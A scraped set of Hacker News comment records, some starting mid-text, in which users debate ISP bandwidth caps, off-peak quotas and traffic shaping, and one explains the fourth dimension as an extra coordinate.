1416554,comment,1416063,1416541,0,0,batiudrami,,,"The way this is combated by Australian ISPs is to offer 'off peak quota' - a kind of bonus for when bandwidth utilisation is low, as well as having people's quotas reset at different times of month.  This isn't a great solution, and would not work for phones as the off peak quota is used for things such as torrenting, when people aren't at their computers.<p>The problem with shaping traffic is that it means companies simply shape during busy periods, rather than increasing capacity.  By offering download limits at set speeds, ISPs guarantee a speed you will receive (limited only by the quality of copper in your phone line).<p>My point is largely that charging people who use download the most more money (and therefore, on average, are increasing the load at peak usage most often) is the most sensible method of controlling load.  If your experience with mobile internet is anything like mine, consumers certainly do not want bandwidth shaping making it any slower.",1276073299

Look in the tank, it's full right?  What you would charge for is accessing the tank at all because unless it is sitting at 0 constantly (complete continuous usage) there is effectively no difference between someone who took 1 gallon

Your point ""but there is still a limit which the company does not wish to reach"" is certainly valid, but properly dealing with this is complex.  Simply capping to e.g. 5 gig is just going to leave you with empty lines for the last part of every month.  Since your problem is utilization, not capacity this doesn't even address it.  You had room for twice as much access but instead you look slow and expensive.<p>If you had a company large enough to run its own networks how would you deal with growing capacity?  By putting some kind of bizarre transfer cap?  No,  that would just get you fired.  Instead, you would shape traffic to even out the utilization and add infra as soon as you passed some utilization threshold.",1276072642

It makes things more complicated than needed.<p>You can't ""visualize"" the fourth dimension (or I haven't met anyone who could... and the kind of math/physics where this comes up was a common topic for me for a while).<p>However, you can understand it pretty easily. Its really just another coordinate. You can do algebra with it. If I say someone is at (3, 2, 5, 6) and moves (1, 2, 3, 4) they are now at (4, 4, 8, 10)...<p>Want a 5th dimension?
